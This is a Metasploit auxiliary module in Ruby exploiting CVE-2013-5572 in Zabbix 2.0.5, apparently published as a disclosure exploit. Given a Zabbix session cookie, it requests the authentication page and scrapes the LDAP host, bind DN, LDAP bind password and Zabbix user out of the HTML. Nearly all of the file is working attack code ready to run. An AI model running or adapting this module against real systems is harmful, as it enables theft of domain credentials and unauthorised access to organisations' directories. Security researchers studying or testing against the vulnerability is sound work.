##
# This module requires Metasploit
# Date: 25-09-2013
# Author: Pablo González
# Vendor Homepage: Zabbix -> http://www.zabbix.com 
# Software Link: http://www.zabbix.com 
# Version: 2.0.5
# Tested On: Linux (Ubuntu, Suse, CentOS)
# CVE: CVE-2013-5572 http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5572
# More Info: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-5572
# 	   http://www.elladodelmal.com/2014/12/como-crear-el-modulo-metasploit-para-el.html
# 	   http://seclists.org/fulldisclosure/2013/Sep/151
#   	   http://www.cvedetails.com/cve/CVE-2013-5572/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ldap_bind_password Zabbix CVE-2013-5572',
      'Description'    => %q{
          Zabbix 2.0.5 allows remote authenticated users to discover the LDAP bind password by leveraging management-console access and reading the ldap_bind_password value in the HTML source code.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ '@pablogonzalezpe, Pablo Gonzalez' ]
    ))

    register_options([
      OptString.new('zbx_session', [true, 'Cookie zbx_sessionid']),
	  OptString.new('TARGETURI', [true, 'Path Zabbix Authentication','/zabbix/authentication.php']),
	  OptInt.new('TIMEOUT', [true, 'HTTP read response timeout (seconds)', 5])
    ], self.class)

  end

  def run
    req
  end
  def req
	resp = send_request_cgi(
      {
		'host' => datastore['RHOST'],
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path.to_s),
        'cookie' => "zbx_sessionid=#{datastore['zbx_session']}",
		'content-type' => 'application/x-www-form-urlencoded'
      }, datastore['TIMEOUT'])
	    
	  ldap_host(resp)
	  user_passDomain(resp)
	  user_zabbix(resp)
  end
  
  def ldap_host(response)
	cut = response.body.split("ldap_host\" value=\"")[1]
	if cut != nil
		host = cut.split("\"")[0]
		print_good "LDAP Host => #{host}"
	end
  end
  
  def user_passDomain(response)
	cut = response.body.split("ldap_bind_dn\" value=\"")[1]
	if cut != nil	
		user = cut.split("\"")[0]
		print_good "User Domain? => #{user}"
	end
	cut = response.body.split("name=\"ldap_bind_password\" value=\"")[1]
	if cut != nil
		pass = cut.split("\"")[0]
		print_good "Password Domain? => #{pass}"
	end
  end

  def user_zabbix(response)
	cut = response.body.split("user\" value=\"")[1]
	if cut != nil
		user = cut.split("\"")[0]
		print_good "User Zabbix => #{user}"
	end
  end
end